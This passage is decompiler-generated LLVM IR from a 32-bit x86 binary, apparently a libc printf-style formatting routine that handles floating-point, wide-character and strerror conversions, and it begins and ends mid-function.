  %v0_804e911 = phi i32 [ %v6_804e886, %dec_label_pc_804e86f ], [ %v6_804e886, %dec_label_pc_804e8b1 ], [ %v1_804e8a1, %dec_label_pc_804e89c ], [ %v6_804e886, %dec_label_pc_804e8b5 ]
  %v0_804e921 = phi i32 [ %v1_804e88b, %dec_label_pc_804e86f ], [ %v1_804e88b, %dec_label_pc_804e8b1 ], [ %v0_804e8bf.pre, %dec_label_pc_804e89c ], [ %v1_804e88b, %dec_label_pc_804e8b5 ]
  %v1_804e8bf = add i32 %v0_804e921, 20
  %v2_804e8bf = inttoptr i32 %v1_804e8bf to i32*
  %v3_804e8bf = load i32, i32* %v2_804e8bf, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_804e8c3 = sub i32 204, %v0_804e911
  %v2_804e8cf = add i32 %v1_804e8c3, %v0_804e921
  %v1_804e8d1 = add i32 %v2_804e8cf, 127
  store i32 %v1_804e8d1, i32* @esi, align 4
  %v2_804e8d4 = icmp slt i32 %v3_804e8bf, 0
  store i1 %v2_804e8d4, i1* %sf.global-to-local, align 1
  %v3_804e8d6 = select i1 %v2_804e8d4, i32 1, i32 %v3_804e8bf
  store i32 %v3_804e8d6, i32* %ecx.global-to-local, align 4
  %v1_804e8d9 = add i32 %v0_804e921, 32
  %v2_804e8d9 = inttoptr i32 %v1_804e8d9 to i8*
  %v3_804e8d9 = load i8, i8* %v2_804e8d9, align 1
  %v4_804e8d9 = and i8 %v3_804e8d9, 16
  %v5_804e8d9 = icmp eq i8 %v4_804e8d9, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_804e8d9, label %dec_label_pc_804e911, label %dec_label_pc_804e8e0

dec_label_pc_804e8e0:                             ; preds = %dec_label_pc_804e8bf
  %v1_804e8e0 = add i32 %v0_804e921, 48
  %v2_804e8e0 = inttoptr i32 %v1_804e8e0 to i32*
  %v3_804e8e0 = load i32, i32* %v2_804e8e0, align 4
  store i32 %v3_804e8e0, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp70 = icmp ult i32 %v3_804e8e0, 3
  %v3_804e8e9 = load i32, i32* @ebp, align 4
  %v5_804e8e9 = select i1 %tmp70, i32 6, i32 %v3_804e8e9
  store i32 %v5_804e8e9, i32* @ebp, align 4
  %v1_804e8ec = add i32 %v3_804e8e0, -3
  %v9_804e8ec = icmp eq i32 %v1_804e8ec, 0
  %v10_804e8ec = icmp slt i32 %v1_804e8ec, 0
  store i1 %v10_804e8ec, i1* %sf.global-to-local, align 1
  %v1_804e8ef = icmp eq i1 %v9_804e8ec, false
  br i1 %v1_804e8ef, label %dec_label_pc_804e8f8, label %dec_label_pc_804e8f1

dec_label_pc_804e8f1:                             ; preds = %dec_label_pc_804e8e0
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804e911

dec_label_pc_804e8f8:                             ; preds = %dec_label_pc_804e8e0
  %v1_804e8f8 = add i32 %v3_804e8e0, -4
  %v9_804e8f8 = icmp eq i32 %v1_804e8f8, 0
  %v10_804e8f8 = icmp slt i32 %v1_804e8f8, 0
  store i1 %v10_804e8f8, i1* %sf.global-to-local, align 1
  %v1_804e8fb = icmp eq i1 %v9_804e8f8, false
  br i1 %v1_804e8fb, label %dec_label_pc_804e911, label %dec_label_pc_804e8fd

dec_label_pc_804e8fd:                             ; preds = %dec_label_pc_804e8f8
  %v2_804e8fd = sub i32 %v3_804e8d6, %v1_804e8d1
  %v7_804e8fd = icmp ult i32 %v3_804e8d6, %v1_804e8d1
  %v12_804e8fd = icmp eq i32 %v2_804e8fd, 0
  %v13_804e8fd = icmp slt i32 %v2_804e8fd, 0
  store i1 %v13_804e8fd, i1* %sf.global-to-local, align 1
  %v2_804e8ff = or i1 %v7_804e8fd, %v12_804e8fd
  br i1 %v2_804e8ff, label %dec_label_pc_804e901, label %dec_label_pc_804e911

dec_label_pc_804e901:                             ; preds = %dec_label_pc_804e8fd
  %v1_804e901 = inttoptr i32 %v0_804e911 to i8*
  %v2_804e901 = load i8, i8* %v1_804e901, align 1
  %v3_804e901 = add i8 %v2_804e901, -48
  %v8_804e901 = icmp eq i8 %v3_804e901, 0
  %v9_804e901 = icmp slt i8 %v3_804e901, 0
  store i1 %v9_804e901, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_804e901, label %dec_label_pc_804e911, label %dec_label_pc_804e90b

dec_label_pc_804e90b:                             ; preds = %dec_label_pc_804e901
  %v1_804e90b = add i32 %v2_804e8cf, 128
  store i32 %v1_804e90b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e911

dec_label_pc_804e911:                             ; preds = %dec_label_pc_804e8fd, %dec_label_pc_804e901, %dec_label_pc_804e8f8, %dec_label_pc_804e8bf, %dec_label_pc_804e8f1, %dec_label_pc_804e90b
  %v0_804e94a = phi i32 [ %v3_804e8d6, %dec_label_pc_804e8fd ], [ 1, %dec_label_pc_804e901 ], [ %v3_804e8d6, %dec_label_pc_804e8f8 ], [ %v3_804e8d6, %dec_label_pc_804e8bf ], [ %v3_804e8d6, %dec_label_pc_804e8f1 ], [ %v1_804e90b, %dec_label_pc_804e90b ]
  %v1_804e911 = inttoptr i32 %v0_804e911 to i8*
  %v2_804e911 = load i8, i8* %v1_804e911, align 1
  %v3_804e911 = add i8 %v2_804e911, -48
  %v8_804e911 = icmp eq i8 %v3_804e911, 0
  %v9_804e911 = icmp slt i8 %v3_804e911, 0
  store i1 %v9_804e911, i1* %sf.global-to-local, align 1
  %v1_804e914 = icmp eq i1 %v8_804e911, false
  br i1 %v1_804e914, label %dec_label_pc_804e942, label %dec_label_pc_804e916

dec_label_pc_804e916:                             ; preds = %dec_label_pc_804e911
  %v0_804e916 = load i32, i32* @ebp, align 4
  %v1_804e916 = add i32 %v0_804e916, -6
  %v6_804e916 = sub i32 5, %v0_804e916
  %v7_804e916 = and i32 %v6_804e916, %v0_804e916
  %v8_804e916 = icmp slt i32 %v7_804e916, 0
  %v10_804e916 = icmp slt i32 %v1_804e916, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_804e91e = icmp eq i1 %v10_804e916, %v8_804e916
  %v5_804e91e = select i1 %v2_804e91e, i32 11, i32 %v0_804e916
  store i32 %v5_804e91e, i32* @ebp, align 4
  %v1_804e921 = add i32 %v0_804e921, 48
  %v2_804e921 = inttoptr i32 %v1_804e921 to i32*
  %v3_804e921 = load i32, i32* %v2_804e921, align 4
  %v4_804e921 = add i32 %v3_804e921, -1
  %v12_804e921 = icmp eq i32 %v4_804e921, 0
  %v13_804e921 = icmp slt i32 %v4_804e921, 0
  store i1 %v13_804e921, i1* %sf.global-to-local, align 1
  %v1_804e926 = icmp eq i1 %v12_804e921, false
  br i1 %v1_804e926, label %dec_label_pc_804e937, label %dec_label_pc_804e928

dec_label_pc_804e928:                             ; preds = %dec_label_pc_804e916
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8056778.155 to i32), i32* @edi, align 4
  br label %dec_label_pc_804eac1

dec_label_pc_804e937:                             ; preds = %dec_label_pc_804e916
  %v1_804e937 = icmp eq i32 %v0_804e94a, 0
  %v2_804e937 = icmp slt i32 %v0_804e94a, 0
  store i1 %v2_804e937, i1* %sf.global-to-local, align 1
  %v1_804e939 = icmp eq i1 %v1_804e937, false
  br i1 %v1_804e939, label %dec_label_pc_804e942, label %dec_label_pc_804e93b

dec_label_pc_804e93b:                             ; preds = %dec_label_pc_804e937
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804eac1

dec_label_pc_804e942:                             ; preds = %dec_label_pc_804e937, %dec_label_pc_804e911
  %v2_804e942 = sub i32 %v0_804e94a, %v1_804e8d1
  %v7_804e942 = icmp ult i32 %v0_804e94a, %v1_804e8d1
  %v12_804e942 = icmp eq i32 %v2_804e942, 0
  %v13_804e942 = icmp slt i32 %v2_804e942, 0
  store i1 %v13_804e942, i1* %sf.global-to-local, align 1
  %v2_804e944 = or i1 %v7_804e942, %v12_804e942
  br i1 %v2_804e944, label %dec_label_pc_804eac1, label %dec_label_pc_804e94a

dec_label_pc_804e94a:                             ; preds = %dec_label_pc_804e942
  store i1 %v13_804e942, i1* %sf.global-to-local, align 1
  store i32 %v2_804e942, i32* @ebx, align 4
  br label %dec_label_pc_804eadb

dec_label_pc_804e953:                             ; preds = %dec_label_pc_804e7e6
  %v1_804e953 = add i32 %v3_804e7b8, -15
  %v5_804e953 = icmp ult i32 %v3_804e7b8, 15
  %v9_804e953 = icmp eq i32 %v1_804e953, 0
  %v10_804e953 = icmp slt i32 %v1_804e953, 0
  store i1 %v10_804e953, i1* %sf.global-to-local, align 1
  %v2_804e956 = or i1 %v5_804e953, %v9_804e953
  br i1 %v2_804e956, label %dec_label_pc_804e958, label %dec_label_pc_804e99d

dec_label_pc_804e958:                             ; preds = %dec_label_pc_804e953
  %v1_804e958 = add i32 %v0_804e7b8.lcssa, 33
  %v2_804e958 = inttoptr i32 %v1_804e958 to i8*
  %v3_804e958 = load i8, i8* %v2_804e958, align 1
  %v4_804e958 = and i8 %v3_804e958, 8
  %v5_804e958 = icmp eq i8 %v4_804e958, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804e95d = add i32 %v0_804e7b8.lcssa, 344
  %v2_804e95d = inttoptr i32 %v1_804e95d to i32*
  %v3_804e95d = load i32, i32* %v2_804e95d, align 4
  store i32 %v3_804e95d, i32* %edx.global-to-local, align 4
  br i1 %v5_804e958, label %dec_label_pc_804e96a, label %dec_label_pc_804e966

dec_label_pc_804e966:                             ; preds = %dec_label_pc_804e958
  %v1_804e966 = inttoptr i32 %v3_804e95d to x86_fp80*
  %v2_804e966 = load x86_fp80, x86_fp80* %v1_804e966, align 4
  br label %dec_label_pc_804e96c

dec_label_pc_804e96a:                             ; preds = %dec_label_pc_804e958
  %v1_804e96a = inttoptr i32 %v3_804e95d to double*
  %v2_804e96a = load double, double* %v1_804e96a, align 4
  %v3_804e96a = fpext double %v2_804e96a to x86_fp80
  br label %dec_label_pc_804e96c

dec_label_pc_804e96c:                             ; preds = %dec_label_pc_804e966, %dec_label_pc_804e96a
  %storemerge5 = phi x86_fp80 [ %v2_804e966, %dec_label_pc_804e966 ], [ %v3_804e96a, %dec_label_pc_804e96a ]
  store x86_fp80 %storemerge5, x86_fp80* %st0.global-to-local, align 4
  %v0_804e96c = load i32, i32* @esi, align 4
  %v2_804e96c = add i32 %v0_804e7b8.lcssa, -4
  %v3_804e96c = inttoptr i32 %v2_804e96c to i32*
  store i32 %v0_804e96c, i32* %v3_804e96c, align 4
  %v0_804e96d = load i32, i32* @esi, align 4
  %v2_804e96d = add i32 %v0_804e7b8.lcssa, -8
  %v3_804e96d = inttoptr i32 %v2_804e96d to i32*
  store i32 %v0_804e96d, i32* %v3_804e96d, align 4
  %v1_804e96e = add i32 %v0_804e7b8.lcssa, -12
  %v2_804e96e = inttoptr i32 %v1_804e96e to i32*
  store i32 134538798, i32* %v2_804e96e, align 4
  %v1_804e973 = add i32 %v0_804e7b8.lcssa, 20
  store i32 %v1_804e973, i32* %eax.global-to-local, align 4
  %v2_804e977 = add i32 %v0_804e7b8.lcssa, -16
  %v3_804e977 = inttoptr i32 %v2_804e977 to i32*
  store i32 %v1_804e973, i32* %v3_804e977, align 4
  %v1_804e978 = add i32 %v0_804e7b8.lcssa, -28
  %v10_804e978 = icmp slt i32 %v1_804e978, 0
  store i1 %v10_804e978, i1* %sf.global-to-local, align 1
  %v1_804e97b = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804e97b = inttoptr i32 %v1_804e978 to x86_fp80*
  store x86_fp80 %v1_804e97b, x86_fp80* %v3_804e97b, align 4
  %v1_804e97e = add i32 %v0_804e7b8.lcssa, 368
  %v2_804e97e = inttoptr i32 %v1_804e97e to i32*
  %v3_804e97e = load i32, i32* %v2_804e97e, align 4
  %v5_804e97e = add i32 %v0_804e7b8.lcssa, -32
  %v6_804e97e = inttoptr i32 %v5_804e97e to i32*
  store i32 %v3_804e97e, i32* %v6_804e97e, align 4
  %v0_804e985 = call i32 @_fpmaxtostr()
  store i32 %v0_804e985, i32* %eax.global-to-local, align 4
  %v0_804e98a = load i32, i32* @esp, align 4
  %v1_804e98a = add i32 %v0_804e98a, 32
  %v2_804e98d = icmp slt i32 %v0_804e985, 0
  store i1 %v2_804e98d, i1* %sf.global-to-local, align 1
  br i1 %v2_804e98d, label %dec_label_pc_804ec3b, label %dec_label_pc_804e995

dec_label_pc_804e995:                             ; preds = %dec_label_pc_804e96c
  %v1_804e995 = inttoptr i32 %v1_804e98a to i32*
  %v2_804e995 = load i32, i32* %v1_804e995, align 4
  %v4_804e995 = add i32 %v2_804e995, %v0_804e985
  %v15_804e995 = icmp slt i32 %v4_804e995, 0
  store i1 %v15_804e995, i1* %sf.global-to-local, align 1
  store i32 %v4_804e995, i32* %v1_804e995, align 4
  %v0_804ec28.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ec28

dec_label_pc_804e99d:                             ; preds = %dec_label_pc_804e953
  %v1_804e99d = add i32 %v3_804e7b8, -17
  %v5_804e99d = icmp ult i32 %v3_804e7b8, 17
  %v9_804e99d = icmp eq i32 %v1_804e99d, 0
  %v10_804e99d = icmp slt i32 %v1_804e99d, 0
  store i1 %v10_804e99d, i1* %sf.global-to-local, align 1
  %v2_804e9a0 = or i1 %v5_804e99d, %v9_804e99d
  br i1 %v2_804e9a0, label %dec_label_pc_804e9a6, label %dec_label_pc_804ea3a

dec_label_pc_804e9a6:                             ; preds = %dec_label_pc_804e99d
  %v1_804e9a6 = add i32 %v0_804e7b8.lcssa, 332
  %v2_804e9a6 = inttoptr i32 %v1_804e9a6 to i32*
  store i32 0, i32* %v2_804e9a6, align 4
  %v0_804e9b1 = load i32, i32* @esp, align 4
  %v1_804e9b1 = add i32 %v0_804e9b1, 344
  %v2_804e9b1 = inttoptr i32 %v1_804e9b1 to i32*
  %v3_804e9b1 = load i32, i32* %v2_804e9b1, align 4
  store i32 %v3_804e9b1, i32* %edx.global-to-local, align 4
  %v1_804e9b8 = icmp eq i1 %v9_804e99d, false
  br i1 %v1_804e9b8, label %dec_label_pc_804ea0a, label %dec_label_pc_804e9ba

dec_label_pc_804e9ba:                             ; preds = %dec_label_pc_804e9a6
  %v1_804e9ba = inttoptr i32 %v3_804e9b1 to i32*
  %v2_804e9ba = load i32, i32* %v1_804e9ba, align 4
  store i32 %v2_804e9ba, i32* %eax.global-to-local, align 4
  %v1_804e9bc = icmp eq i32 %v2_804e9ba, 0
  %v2_804e9bc = icmp slt i32 %v2_804e9ba, 0
  store i1 %v2_804e9bc, i1* %sf.global-to-local, align 1
  %v2_804e9be = add i32 %v0_804e9b1, 340
  %v3_804e9be = inttoptr i32 %v2_804e9be to i32*
  store i32 %v2_804e9ba, i32* %v3_804e9be, align 4
  br i1 %v1_804e9bc, label %dec_label_pc_804eac5, label %dec_label_pc_804e9cb

dec_label_pc_804e9cb:                             ; preds = %dec_label_pc_804e9ba
  %v0_804e9cb = load i32, i32* @esp, align 4
  %v1_804e9cb = add i32 %v0_804e9cb, 20
  %v2_804e9cb = inttoptr i32 %v1_804e9cb to i32*
  %v3_804e9cb = load i32, i32* %v2_804e9cb, align 4
  %v1_804e9d2 = add i32 %v0_804e9cb, 340
  store i32 %v1_804e9d2, i32* %ecx.global-to-local, align 4
  %v2_804e9d9 = icmp slt i32 %v3_804e9cb, 0
  store i1 %v2_804e9d9, i1* %sf.global-to-local, align 1
  %v1_804e9db = icmp eq i1 %v2_804e9d9, false
  %v4_804e9db = select i1 %v1_804e9db, i32 %v3_804e9cb, i32 -1
  store i32 %v4_804e9db, i32* %edx.global-to-local, align 4
  %v1_804e9de = add i32 %v0_804e9cb, 332
  store i32 %v1_804e9de, i32* %eax.global-to-local, align 4
  %v2_804e9e5 = add i32 %v0_804e9cb, -4
  %v3_804e9e5 = inttoptr i32 %v2_804e9e5 to i32*
  store i32 %v1_804e9de, i32* %v3_804e9e5, align 4
  %v0_804e9e6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e9e6 = add i32 %v0_804e9cb, -8
  %v3_804e9e6 = inttoptr i32 %v2_804e9e6 to i32*
  store i32 %v0_804e9e6, i32* %v3_804e9e6, align 4
  %v0_804e9e7 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e9e7 = add i32 %v0_804e9cb, -12
  %v3_804e9e7 = inttoptr i32 %v2_804e9e7 to i32*
  store i32 %v0_804e9e7, i32* %v3_804e9e7, align 4
  %v0_804e9e8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e9e8 = add i32 %v0_804e9cb, -16
  %v3_804e9e8 = inttoptr i32 %v2_804e9e8 to i32*
  store i32 %v0_804e9e8, i32* %v3_804e9e8, align 4
  %v0_804e9e9 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e9e9, i32* %eax.global-to-local, align 4
  %v0_804e9ee = load i32, i32* @esp, align 4
  %v1_804e9ee = add i32 %v0_804e9ee, 16
  %v1_804e9f1 = add i32 %v0_804e9e9, 1
  %v10_804e9f1 = icmp eq i32 %v1_804e9f1, 0
  %v11_804e9f1 = icmp slt i32 %v1_804e9f1, 0
  store i1 %v11_804e9f1, i1* %sf.global-to-local, align 1
  store i32 %v0_804e9e9, i32* @esi, align 4
  br i1 %v10_804e9f1, label %dec_label_pc_804ec3b, label %dec_label_pc_804e9fc

dec_label_pc_804e9fc:                             ; preds = %dec_label_pc_804e9cb
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804ead6

dec_label_pc_804ea0a:                             ; preds = %dec_label_pc_804e9a6
  %v0_804ea0a = load i32, i32* @ebx, align 4
  %v2_804ea0a = add i32 %v0_804e9b1, -4
  %v3_804ea0a = inttoptr i32 %v2_804ea0a to i32*
  store i32 %v0_804ea0a, i32* %v3_804ea0a, align 4
  %v1_804ea0b = add i32 %v0_804e9b1, 332
  store i32 %v1_804ea0b, i32* %eax.global-to-local, align 4
  %v2_804ea12 = add i32 %v0_804e9b1, -8
  %v3_804ea12 = inttoptr i32 %v2_804ea12 to i32*
  store i32 %v1_804ea0b, i32* %v3_804ea12, align 4
  %v0_804ea13 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ea13 = inttoptr i32 %v0_804ea13 to i32*
  %v2_804ea13 = load i32, i32* %v1_804ea13, align 4
  %v4_804ea13 = add i32 %v0_804e9b1, -12
  %v5_804ea13 = inttoptr i32 %v4_804ea13 to i32*
  store i32 %v2_804ea13, i32* %v5_804ea13, align 4
  %v1_804ea15 = add i32 %v0_804e9b1, 204
  store i32 %v1_804ea15, i32* @edi, align 4
  %v2_804ea1c = add i32 %v0_804e9b1, -16
  %v3_804ea1c = inttoptr i32 %v2_804ea1c to i32*
  store i32 %v1_804ea15, i32* %v3_804ea1c, align 4
  %v0_804ea1d = call i32 @__GI_wcrtomb()
  store i32 %v0_804ea1d, i32* %eax.global-to-local, align 4
  %v0_804ea22 = load i32, i32* @esp, align 4
  %v1_804ea22 = add i32 %v0_804ea22, 16
  %v1_804ea25 = add i32 %v0_804ea1d, 1
  %v10_804ea25 = icmp eq i32 %v1_804ea25, 0
  %v11_804ea25 = icmp slt i32 %v1_804ea25, 0
  store i1 %v11_804ea25, i1* %sf.global-to-local, align 1
  store i32 %v0_804ea1d, i32* @esi, align 4
  br i1 %v10_804ea25, label %dec_label_pc_804ec3b, label %dec_label_pc_804ea30

dec_label_pc_804ea30:                             ; preds = %dec_label_pc_804ea0a
  %v2_804ea30 = add i32 %v0_804ea1d, 220
  %v3_804ea30 = add i32 %v2_804ea30, %v0_804ea22
  %v4_804ea30 = inttoptr i32 %v3_804ea30 to i8*
  store i8 0, i8* %v4_804ea30, align 1
  br label %dec_label_pc_804ea68

dec_label_pc_804ea3a:                             ; preds = %dec_label_pc_804e99d
  %v1_804ea3a = add i32 %v3_804e7b8, -19
  %v5_804ea3a = icmp ult i32 %v3_804e7b8, 19
  %v9_804ea3a = icmp eq i32 %v1_804ea3a, 0
  %v10_804ea3a = icmp slt i32 %v1_804ea3a, 0
  store i1 %v10_804ea3a, i1* %sf.global-to-local, align 1
  %v2_804ea3d = or i1 %v5_804ea3a, %v9_804ea3a
  br i1 %v2_804ea3d, label %dec_label_pc_804ea3f, label %dec_label_pc_804ea97

dec_label_pc_804ea3f:                             ; preds = %dec_label_pc_804ea3a
  %v1_804ea3f = add i32 %v0_804e7b8.lcssa, 344
  %v2_804ea3f = inttoptr i32 %v1_804ea3f to i32*
  %v3_804ea3f = load i32, i32* %v2_804ea3f, align 4
  store i32 %v3_804ea3f, i32* %edx.global-to-local, align 4
  %v1_804ea46 = icmp eq i1 %v9_804ea3a, false
  %v1_804ea71 = inttoptr i32 %v3_804ea3f to i32*
  %v2_804ea71 = load i32, i32* %v1_804ea71, align 4
  br i1 %v1_804ea46, label %dec_label_pc_804ea71, label %dec_label_pc_804ea48

dec_label_pc_804ea48:                             ; preds = %dec_label_pc_804ea3f
  store i32 %v2_804ea71, i32* @edi, align 4
  %v1_804ea4a = icmp eq i32 %v2_804ea71, 0
  %v2_804ea4a = icmp slt i32 %v2_804ea71, 0
  store i1 %v2_804ea4a, i1* %sf.global-to-local, align 1
  br i1 %v1_804ea4a, label %dec_label_pc_804eac5, label %dec_label_pc_804ea4e

dec_label_pc_804ea4e:                             ; preds = %dec_label_pc_804ea48, %dec_label_pc_804eaa0
  %v1_804ea55 = phi i32 [ %v0_804e7b8.lcssa, %dec_label_pc_804ea48 ], [ %v1_804eaba, %dec_label_pc_804eaa0 ]
  %v1_804ea4e = add i32 %v1_804ea55, 20
  %v2_804ea4e = inttoptr i32 %v1_804ea4e to i32*
  %v3_804ea4e = load i32, i32* %v2_804ea4e, align 4
  store i32 %v3_804ea4e, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_804ea55 = add i32 %v1_804ea55, -4
  %v3_804ea55 = inttoptr i32 %v2_804ea55 to i32*
  store i32 %v3_804e7b8, i32* %v3_804ea55, align 4
  %v2_804ea56 = add i32 %v1_804ea55, -8
  %v3_804ea56 = inttoptr i32 %v2_804ea56 to i32*
  store i32 %v3_804e7b8, i32* %v3_804ea56, align 4
  %v2_804ea57 = icmp slt i32 %v3_804ea4e, 0
  store i1 %v2_804ea57, i1* %sf.global-to-local, align 1
  %v1_804ea59 = icmp eq i1 %v2_804ea57, false
  %v2_804ea59 = load i32, i32* %eax.global-to-local, align 4
  %v4_804ea59 = select i1 %v1_804ea59, i32 %v3_804ea4e, i32 %v2_804ea59
  store i32 %v4_804ea59, i32* %eax.global-to-local, align 4
  %v2_804ea5c = add i32 %v1_804ea55, -12
  %v3_804ea5c = inttoptr i32 %v2_804ea5c to i32*
  store i32 %v4_804ea59, i32* %v3_804ea5c, align 4
  %v0_804ea5d = load i32, i32* @edi, align 4
  %v2_804ea5d = add i32 %v1_804ea55, -16
  %v3_804ea5d = inttoptr i32 %v2_804ea5d to i32*
  store i32 %v0_804ea5d, i32* %v3_804ea5d, align 4
  %v0_804ea5e = call i32 @strnlen()
  store i32 %v0_804ea5e, i32* %eax.global-to-local, align 4
  %v0_804ea63 = load i32, i32* @esp, align 4
  %v1_804ea63 = add i32 %v0_804ea63, 16
  %v7_804ea63 = icmp slt i32 %v1_804ea63, 0
  store i1 %v7_804ea63, i1* %sf.global-to-local, align 1
  store i32 %v0_804ea5e, i32* @esi, align 4
  br label %dec_label_pc_804ea68

dec_label_pc_804ea68:                             ; preds = %dec_label_pc_804ea30, %dec_label_pc_804ea4e
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804ead6

dec_label_pc_804ea71:                             ; preds = %dec_label_pc_804ea3f
  store i32 %v2_804ea71, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_804ea7f = add i32 %v0_804e7b8.lcssa, 204
  store i32 %v1_804ea7f, i32* @edi, align 4
  %v1_804ea86 = add i32 %v0_804e7b8.lcssa, 205
  %v2_804ea86 = inttoptr i32 %v1_804ea86 to i8*
  store i8 0, i8* %v2_804ea86, align 1
  %v0_804ea8e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea8e = trunc i32 %v0_804ea8e to i8
  %v2_804ea8e = load i32, i32* @esp, align 4
  %v3_804ea8e = add i32 %v2_804ea8e, 204
  %v4_804ea8e = inttoptr i32 %v3_804ea8e to i8*
  store i8 %v1_804ea8e, i8* %v4_804ea8e, align 1
  br label %dec_label_pc_804ead6

dec_label_pc_804ea97:                             ; preds = %dec_label_pc_804ea3a
  %v1_804ea97 = add i32 %v3_804e7b8, -20
  %v9_804ea97 = icmp eq i32 %v1_804ea97, 0
  %v10_804ea97 = icmp slt i32 %v1_804ea97, 0
  store i1 %v10_804ea97, i1* %sf.global-to-local, align 1
  %v1_804ea9a = icmp eq i1 %v9_804ea97, false
  br i1 %v1_804ea9a, label %dec_label_pc_804ec3b, label %dec_label_pc_804eaa0

dec_label_pc_804eaa0:                             ; preds = %dec_label_pc_804ea97
  %v0_804eaa0 = load i32, i32* %stack_var_-364, align 4
  %v1_804eaa0 = call i32 @__errno_location(i32 %v0_804eaa0)
  store i32 %v1_804eaa0, i32* %eax.global-to-local, align 4
  %v0_804eaa5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804eaa5 = load i32, i32* @esp, align 4
  %v2_804eaa5 = add i32 %v1_804eaa5, -4
  %v3_804eaa5 = inttoptr i32 %v2_804eaa5 to i32*
  store i32 %v0_804eaa5, i32* %v3_804eaa5, align 4
  %v1_804eaa6 = add i32 %v1_804eaa5, -8
  %v2_804eaa6 = inttoptr i32 %v1_804eaa6 to i32*
  store i32 128, i32* %v2_804eaa6, align 4
  %v1_804eaab = add i32 %v1_804eaa5, 204
  store i32 %v1_804eaab, i32* %edx.global-to-local, align 4
  %v2_804eab2 = add i32 %v1_804eaa5, -12
  %v3_804eab2 = inttoptr i32 %v2_804eab2 to i32*
  store i32 %v1_804eaab, i32* %v3_804eab2, align 4
  %v1_804eab3 = inttoptr i32 %v1_804eaa0 to i32*
  %v2_804eab3 = load i32, i32* %v1_804eab3, align 4
  %v4_804eab3 = add i32 %v1_804eaa5, -16
  %v5_804eab3 = inttoptr i32 %v4_804eab3 to i32*
  store i32 %v2_804eab3, i32* %v5_804eab3, align 4
  %v0_804eab5 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804eab5, i32* %eax.global-to-local, align 4
  %v0_804eaba = load i32, i32* @esp, align 4
  %v1_804eaba = add i32 %v0_804eaba, 16
  %v7_804eaba = icmp slt i32 %v1_804eaba, 0
  store i1 %v7_804eaba, i1* %sf.global-to-local, align 1
  store i32 %v0_804eab5, i32* @edi, align 4
  br label %dec_label_pc_804ea4e

dec_label_pc_804eac1:                             ; preds = %dec_label_pc_804e942, %dec_label_pc_804e93b, %dec_label_pc_804e928
  %v0_804eade35 = phi i32 [ %v1_804e8d1, %dec_label_pc_804e942 ], [ 0, %dec_label_pc_804e93b ], [ 5, %dec_label_pc_804e928 ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804eadb

dec_label_pc_804eac5:                             ; preds = %dec_label_pc_804ea48, %dec_label_pc_804e9ba
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805677e.156 to i32), i32* @edi, align 4
  br label %dec_label_pc_804ead6

dec_label_pc_804ead6:                             ; preds = %dec_label_pc_804ea71, %dec_label_pc_804ea68, %dec_label_pc_804e9fc, %dec_label_pc_804eac5
  %v0_804ead6 = load i32, i32* @esp, align 4
  %v1_804ead6 = add i32 %v0_804ead6, 7
  %v2_804ead6 = inttoptr i32 %v1_804ead6 to i8*
  store i8 32, i8* %v2_804ead6, align 1
  %v0_804eade.pre = load i32, i32* @esi, align 4
  %v1_804eade.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804eadb

dec_label_pc_804eadb:                             ; preds = %dec_label_pc_804eac1, %dec_label_pc_804e94a, %dec_label_pc_804ead6
  %v1_804eade = phi i32 [ 0, %dec_label_pc_804eac1 ], [ %v2_804e942, %dec_label_pc_804e94a ], [ %v1_804eade.pre, %dec_label_pc_804ead6 ]
  %v0_804eade = phi i32 [ %v0_804eade35, %dec_label_pc_804eac1 ], [ %v1_804e8d1, %dec_label_pc_804e94a ], [ %v0_804eade.pre, %dec_label_pc_804ead6 ]
  %v0_804eadb = load i32, i32* @ebp, align 4
  %v1_804eadb = add i32 %v0_804eadb, -11
  %v9_804eadb = icmp eq i32 %v1_804eadb, 0
  %v10_804eadb = icmp slt i32 %v1_804eadb, 0
  store i1 %v10_804eadb, i1* %sf.global-to-local, align 1
  %v2_804eade = add i32 %v0_804eade, %v1_804eade
  store i32 %v2_804eade, i32* @edx, align 4
  br i1 %v9_804eadb, label %dec_label_pc_804eaef, label %dec_label_pc_804eae3

dec_label_pc_804eae3:                             ; preds = %dec_label_pc_804eadb
  %v1_804eae5 = add i32 %v0_804eadb, -5
  %v6_804eae5 = sub i32 4, %v0_804eadb
  %v7_804eae5 = and i32 %v6_804eae5, %v0_804eadb
  %v8_804eae5 = icmp slt i32 %v7_804eae5, 0
